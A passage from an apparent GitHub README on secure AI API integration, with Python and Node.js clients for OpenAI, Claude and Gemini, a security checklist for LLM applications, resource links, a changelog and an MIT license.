                # The key goes into a header, never into the URL (URLs end up in logs)
                {"x-goog-api-key": self._key("GOOGLE_API_KEY")},
                {
                    "contents": [{"parts": [{"text": prompt}]}],
                    "generationConfig": {"maxOutputTokens": max_tokens},
                },
            )

        raise ValueError(f"Unknown provider: {provider}")

    @staticmethod
    def _extract_text(provider: str, data: dict[str, Any]) -> str:
        """Extract the response text from a provider response"""
        if provider == "openai":
            # Responses API: collect all output_text blocks of "message" items
            parts = [
                block.get("text", "")
                for item in data.get("output", [])
                if item.get("type") == "message"
                for block in item.get("content", [])
                if block.get("type") == "output_text"
            ]
        elif provider == "claude":
            parts = [b.get("text", "") for b in data.get("content", []) if b.get("type") == "text"]
        elif provider == "gemini":
            candidates = data.get("candidates") or [{}]
            parts = [p.get("text", "") for p in candidates[0].get("content", {}).get("parts", [])]
        else:
            raise ValueError(f"Unknown provider: {provider}")

        text = "".join(parts)
        if not text:
            raise RuntimeError(f"Invalid {provider} response format")
        return text

    async def chat(
        self,
        provider: str,
        prompt: str,
        model: str | None = None,
        max_tokens: int = 2000,
    ) -> str:
        """
        Send a prompt to the specified provider

        Args:
            provider: openai | claude | gemini
            prompt: User prompt
            model: Optional model override (default: <PROVIDER>_MODEL env var)
            max_tokens: Max output tokens. Reasoning/thinking models spend part
                of this budget on hidden reasoning tokens, so keep it generous.

        Returns:
            AI response text

        Raises:
            ValueError: If provider is unknown or the API key is missing
            RuntimeError: If the API request fails
        """
        url, headers, payload = self._build_request(provider, prompt, model, max_tokens)

        async with aiohttp.ClientSession(timeout=TIMEOUT) as session:
            async with session.post(url, headers=headers, json=payload) as resp:
                if resp.status != 200:
                    # Status only: response bodies can contain details you don't want in logs
                    raise RuntimeError(f"{provider} API error: HTTP {resp.status}")
                data = await resp.json()

        return self._extract_text(provider, data)


async def main() -> None:
    """Example usage of UniversalAIClient"""
    client = UniversalAIClient()

    requests = [
        ("openai", "Explain AI security in one sentence"),
        ("claude", "Write a haiku about cybersecurity"),
        ("gemini", "What is prompt injection?"),
    ]

    for provider, prompt in requests:
        print(f"Requesting from {provider}...")
        try:
            answer = await client.chat(provider, prompt)
            print(f"{provider}: {answer}\n")
        except ValueError as e:
            print(f"Configuration error: {e}")
        except RuntimeError as e:
            print(f"API error: {e}")


if __name__ == "__main__":
    asyncio.run(main())
```

---

### Node.js Implementation

```javascript
/**
 * Universal AI API Client - Node.js Implementation
 * Supports OpenAI, Anthropic Claude and Google Gemini.
 *
 * No dependencies (native fetch). Requires Node.js 22+.
 * Run with: node --env-file=.env app.js
 *
 * Environment variables (only for the providers you use):
 *   OPENAI_API_KEY    [OPENAI_MODEL]
 *   ANTHROPIC_API_KEY [ANTHROPIC_MODEL]
 *   GOOGLE_API_KEY    [GEMINI_MODEL]
 */
const ANTHROPIC_VERSION = '2026-10-21'; // https://platform.claude.com/docs/en/api/versioning
const TIMEOUT_MS = 30_000;

class UniversalAIClient {
    /** Read an API key lazily, so only the providers you use need a key */
    #key(envName) {
        const key = process.env[envName];
        if (!key) {
            throw new Error(`Missing API key: set ${envName}`);
        }
        return key;
    }

    /** Return { url, headers, payload } for a provider */
    #buildRequest(provider, prompt, { model, maxTokens }) {
        switch (provider) {
            case 'openai':
                return {
                    url: 'https://api.openai.com/v1/responses',
                    headers: { Authorization: `Bearer ${this.#key('OPENAI_API_KEY')}` },
                    payload: {
                        model: model || process.env.OPENAI_MODEL || 'gpt-6-luna',
                        input: prompt,
                        max_output_tokens: maxTokens,
                        store: false, // don't keep prompts/responses at the provider
                    },
                };

            case 'claude':
                return {
                    url: 'https://api.anthropic.com/v1/messages',
                    headers: {
                        Authorization: `Bearer ${this.#key('ANTHROPIC_API_KEY')}`,
                        'anthropic-version': ANTHROPIC_VERSION,
                    },
                    payload: {
                        model: model || process.env.ANTHROPIC_MODEL || 'claude-sonnet-5-5',
                        max_tokens: maxTokens,
                        messages: [{ role: 'user', content: prompt }],
                    },
                };

            case 'gemini': {
                const geminiModel = encodeURIComponent(model || process.env.GEMINI_MODEL || 'gemini-3.8-flash');
                return {
                    url: `https://generativelanguage.googleapis.com/v1beta/models/${geminiModel}:generateContent`,
                    // The key goes into a header, never into the URL (URLs end up in logs)
                    headers: { 'x-goog-api-key': this.#key('GOOGLE_API_KEY') },
                    payload: {
                        contents: [{ parts: [{ text: prompt }] }],
                        generationConfig: { maxOutputTokens: maxTokens },
                    },
                };
            }

            default:
                throw new Error(`Unknown provider: ${provider}`);
        }
    }

    /** Extract the response text from a provider response */
    #extractText(provider, data) {
        let text = '';

        if (provider === 'openai') {
            // Responses API: collect all output_text blocks of "message" items
            for (const item of data.output ?? []) {
                if (item.type !== 'message') continue;
                for (const block of item.content ?? []) {
                    if (block.type === 'output_text') text += block.text ?? '';
                }
            }
        } else if (provider === 'claude') {
            text = (data.content ?? [])
                .filter((block) => block.type === 'text')
                .map((block) => block.text)
                .join('');
        } else if (provider === 'gemini') {
            text = (data.candidates?.[0]?.content?.parts ?? []).map((part) => part.text ?? '').join('');
        }

        if (!text) {
            throw new Error(`Invalid ${provider} response format`);
        }
        return text;
    }

    /**
     * Send a prompt to the specified provider
     *
     * @param {'openai'|'claude'|'gemini'} provider
     * @param {string} prompt
     * @param {{ model?: string, maxTokens?: number }} [options]
     *   maxTokens: reasoning/thinking models spend part of it on hidden reasoning tokens
     */
    async chat(provider, prompt, { model, maxTokens = 2000 } = {}) {
        const { url, headers, payload } = this.#buildRequest(provider, prompt, { model, maxTokens });

        const response = await fetch(url, {
            method: 'POST',
            headers: { ...headers, 'Content-Type': 'application/json' },
            body: JSON.stringify(payload),
            redirect: 'error', // never follow redirects with credentials attached
            signal: AbortSignal.timeout(TIMEOUT_MS),
        });

        if (!response.ok) {
            // Status only: response bodies can contain details you don't want in logs
            throw new Error(`${provider} API error: HTTP ${response.status}`);
        }

        return this.#extractText(provider, await response.json());
    }
}

module.exports = UniversalAIClient;

// Usage example (runs only when executed directly, not when imported)
if (require.main === module) {
    (async () => {
        try {
            const client = new UniversalAIClient();

            console.log('Requesting from OpenAI...');
            console.log(`OpenAI: ${await client.chat('openai', 'Explain AI security briefly')}\n`);

            console.log('Requesting from Claude...');
            console.log(`Claude: ${await client.chat('claude', 'Write a haiku about security')}\n`);

            console.log('Requesting from Gemini...');
            console.log(`Gemini: ${await client.chat('gemini', 'What is XSS?')}\n`);
        } catch (error) {
            console.error(`Error: ${error.message}`);
            process.exitCode = 1;
        }
    })();
}
```

---
## Security Checklist

### Backend Security

- [ ] **API Keys in Environment Variables / Secrets Manager** - Never hardcode keys in source code; keep `.env` outside the web root
- [ ] **Input Validation & Sanitization** - Validate all user inputs before processing
- [ ] **Authorization Enforced in Code** - Never rely on the model or the system prompt for access control
- [ ] **Output Escaping (XSS Prevention)** - Escape or strictly sanitize LLM outputs; no external images/links from model output
- [ ] **Rate Limiting Implemented** - Per user/IP, in a persistent store (not a per-request cache)
- [ ] **Token Caps & Timeouts** - Limit input size, `max_tokens` and request duration
- [ ] **HTTPS-only Communication** - Enforce encrypted connections
- [ ] **Error Handling without Info Leaks** - Don't expose sensitive error details
- [ ] **Logging without Secrets** - Never log API keys, auth headers or unnecessary prompt content/PII
- [ ] **No Keys in URLs** - Use header-based authentication
- [ ] **CORS Configured Correctly** - Whitelist only trusted domains
- [ ] **Request Size Limits** - Prevent oversized payloads

### Frontend Security

- [ ] **No API Keys in Client** - All API calls go through backend
- [ ] **CSRF Protection (Nonces/Tokens)** - Implement anti-CSRF measures
- [ ] **Content Security Policy Headers** - Restrict resource loading
- [ ] **XSS Protection Active** - Render LLM output as text or strictly sanitized HTML
- [ ] **Sub-Resource Integrity (SRI)** - Verify external script integrity
- [ ] **No Sensitive Data in Web Storage** - Don't keep tokens, secrets or chat transcripts in `localStorage`/`sessionStorage`; use HttpOnly cookies or server-side sessions
- [ ] **Input Length Limits** - Client-side validation before submission

### AI-Specific Security

- [ ] **Untrusted Content Treated as Untrusted** - User input, RAG chunks, web pages, emails and tool/MCP results can all contain injected instructions
- [ ] **No Secrets in Prompts or Context** - Assume system prompts can be extracted
- [ ] **Structured Output Validated** - Check model output against a schema before using it
- [ ] **Least-Privilege Tools** - Minimal tool set, scoped credentials per tool
- [ ] **Human Approval for Sensitive Actions** - Payments, deletions, outgoing messages, deployments
- [ ] **No "Lethal Trifecta"** - Don't combine private data, untrusted content and external communication in one agent without controls
- [ ] **Per-Tenant Access Control on RAG/Vector Stores** - Filter at retrieval time, not in the prompt
- [ ] **MCP Servers, Plugins and Models Vetted and Pinned** - Treat them as third-party code
- [ ] **Requests Attributable to Users** - Send a hashed, stable user ID (e.g. `safety_identifier`), never raw emails or usernames
- [ ] **Prompt-Injection Tests** - Regression tests or red-teaming (e.g. with [garak](https://github.com/NVIDIA/garak)) before every major change

### Production Security

- [ ] **Secrets Management** - Use Vault, AWS Secrets Manager, or similar
- [ ] **Short-Lived Credentials Where Possible** - Workload Identity Federation / cloud IAM instead of static keys
- [ ] **API Key Rotation & Expiry** - Regularly rotate keys; set an expiry where the provider supports it
- [ ] **Secret Scanning & Push Protection** - Enabled on every repository
- [ ] **Monitoring & Alerting** - Track API usage, cost spikes and 401/429 rates
- [ ] **Budget Limits at Providers** - Set spending caps per project/workspace
- [ ] **Audit Logs Enabled** - Track all API and tool requests
- [ ] **Dependency Scanning** - Lockfiles, `npm ci`, `npm audit`, `composer audit`, `pip-audit`
- [ ] **WAF/DDoS Protection** - Implement web application firewall
- [ ] **Data Protection** - Data processing agreement with the provider, minimize personal data in prompts, check retention/zero-data-retention options
- [ ] **Backup, Disaster Recovery & Provider Failover** - Plan for service outages and deprecated models

---

## Provider-Specific Documentation

### OpenAI

* [Production Best Practices](https://developers.openai.com/api/docs/guides/production-best-practices)
* [Safety Best Practices](https://developers.openai.com/api/docs/guides/safety-best-practices)
* [Rate Limits](https://developers.openai.com/api/docs/guides/rate-limits)
* [Spend Limits](https://developers.openai.com/api/docs/guides/spend-limits)
* [Workload Identity Federation](https://developers.openai.com/api/docs/guides/workload-identity-federation)
* [Migrate to the Responses API](https://developers.openai.com/api/docs/guides/migrate-to-responses)

### Anthropic Claude

* [API Key Best Practices](https://support.claude.com/en/articles/9767949-api-key-best-practices-keeping-your-keys-safe-and-secure)
* [Authentication (key types, expiry, Workload Identity Federation)](https://platform.claude.com/docs/en/manage-claude/authentication)
* [Mitigate Jailbreaks and Prompt Injections](https://platform.claude.com/docs/en/test-and-evaluate/strengthen-guardrails/mitigate-jailbreaks)
* [Rate Limits](https://platform.claude.com/docs/en/api/rate-limits)
* [API Versions](https://platform.claude.com/docs/en/api/versioning)

### Google Gemini

* [API Keys (incl. "Keep your API key secure")](https://ai.google.dev/gemini-api/docs/api-key)
* [Safety Guidance](https://ai.google.dev/gemini-api/docs/safety-guidance)
* [Rate Limits](https://ai.google.dev/gemini-api/docs/rate-limits)
* [Pricing](https://ai.google.dev/gemini-api/docs/pricing)

---

## Additional Security Resources

### OWASP Resources
- [OWASP Top 10 for LLM Applications](https://genai.owasp.org/llm-top-10/)
- [OWASP Top 10 for Agentic Applications (2026)](https://genai.owasp.org/resource/owasp-top-10-for-agentic-applications-for-2026/)
- [OWASP AI Security and Privacy Guide](https://owasp.org/www-project-ai-security-and-privacy-guide/)
- [OWASP Cheat Sheet Series](https://cheatsheetseries.owasp.org/)

### Standards & Frameworks
- [NIST AI Risk Management Framework](https://www.nist.gov/itl/ai-risk-management-framework)
- [ISO/IEC 42001 - AI Management System](https://www.iso.org/standard/81230.html)
- [Model Context Protocol Specification](https://modelcontextprotocol.io/specification/2026-07-28) - see "Security and Trust & Safety"

### Security Tools
- [Gitleaks](https://github.com/gitleaks/gitleaks) - Scan for secrets in git repos
- [TruffleHog](https://github.com/trufflesecurity/trufflehog) - Find leaked credentials
- [GitHub Secret Scanning & Push Protection](https://docs.github.com/en/code-security/secret-scanning) - Block secrets before they land in your repo
- [Dependabot](https://docs.github.com/en/code-security/dependabot) - Automated dependency updates
- [pip-audit](https://github.com/pypa/pip-audit) - Python dependency audit (`npm audit` and `composer audit` are built in)
- [garak](https://github.com/NVIDIA/garak) - LLM vulnerability scanner (prompt injection, leakage, ...)

### Good to know

- [Security Headers — Complete Implementation Guide](https://github.com/VolkanSah/Security-Headers)
- [Securing FastAPI Applications](https://github.com/VolkanSah/Securing-FastAPI-Applications)
- [ModSecurity Webserver Protection Guide](https://github.com/VolkanSah/ModSecurity-Webserver-Protection-Guide)

---

## Support and Contributions

Found this useful?

- ⭐ **Star this repo** to show support
- 🐛 **Report Issues** via GitHub Issues
- 💡 **Suggest Improvements** through Pull Requests
- 🔀 **Contribute** - PRs are welcome!
- 📢 **Share** with your developer community
- **If you are rich** buy me a ☕

### Contributors

Thank you to all contributors who help improve this guide!

---

## Changelog

### 2026-10-29 — The "I can't be bothered anymore" release 🤖

> **From this release on, this guide is written and maintained with Claude (Anthropic).**
> Reason: a hundred other projects on fire and zero motivation left to hand-edit a nine-month-old README.
> Yes, an AI helped update a security guide. Treat it like any other source: read it critically, verify before you trust it, and open an issue or PR if something is off.

**Fixed**
- OWASP Top 10 for LLMs table mixed 2023 numbering with 2025 names. It now matches the official 2025 list.
- Gemini API key was sent in the URL (`?key=`). It is now sent as `x-goog-api-key` header (PHP, Python and Node.js clients).
- Outdated model IDs (`gemini-1.5-pro`, `claude-3-5-sonnet-20241022`). Model IDs now come from environment variables, with current defaults.
- WordPress: `isset()` + `wp_unslash()` on input; strict `wp_kses()` allow-list instead of `wp_kses_post()` (images/links can exfiltrate data); error messages rendered as text; no global `OPENAI_API_KEY` constant; scripts only enqueued for permitted users.
- TYPO3: rate limiting used the per-request `runtime` cache (it never limited anything); `GeneralUtility::sysLog()` no longer exists (PSR-3 logger); double output escaping; one shared rate-limit bucket for all anonymous users; Extbase plugin registration; API call only on POST.
- Node.js example: `temperature || 0.7` turned `0` into `0.7`; importing the module ran the demo.
- Python example: deprecated integer `timeout` for aiohttp (now `ClientTimeout`); response bodies were put into exception messages.
- Table of contents anchors and heading levels (several links were broken); outdated provider links.

**Changed**
- OpenAI examples use the Responses API (`store: false`, `safety_identifier`).
- Anthropic examples use `Authorization: Bearer` and API version `2026-10-21`. `temperature`, `top_p` and `top_k` are no longer sent (removed in that API version).
- Node.js example dropped `axios` (native `fetch`). All clients only require keys for the providers actually used.
- Badges: PHP 8.3+, Python 3.11+, Node.js 22+ (Node.js 18 is end-of-life).

**Added**
- Sections: Prompt Injection and Output Handling; Agents, Tools and MCP; If a Key Leaks.
- `.env` outside the web root, dotfile blocking, short-lived credentials (Workload Identity Federation) and key expiry.
- AI-specific checklist items, data-protection item, OWASP Top 10 for Agentic Applications (2026), MCP specification, secret scanning, garak.

### 2026-01 — Last fully hand-written version

Everything up to here was written by hand by a human who still had motivation.

---

## License

MIT License - see [LICENSE](LICENSE)

Copyright (c) 2025 Volkan Kücükbudak

Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.

---

## Disclaimer

These best practices are **recommendations based on current industry standards**.

**You are responsible for:**
- The security of your implementation
- Compliance with applicable laws and regulations
- Regular security audits and updates
- Monitoring and responding to security incidents

**No guarantees:**
- This guide does not guarantee complete security
- Security is a continuously evolving field
- New vulnerabilities may emerge
- Always stay informed about latest threats

**Professional advice:**
- For production systems handling sensitive data, consult security professionals
- Conduct regular penetration testing
- Implement defense-in-depth strategies
- Have an incident response plan

---

**Stay vigilant. Stay secure. 🔒**

<p align="center">
  <sub>Made with 💀 for the WordPress & TYPO3 Community</sub><br>
  <sub>Maintained by <a href="https://github.com/volkansah">Volkan Kücükbudak</a></sub><br>
  <sub>Last Updated: Oct 2026 (with Claude, see <a href="#changelog">Changelog</a>)</sub>
</p>
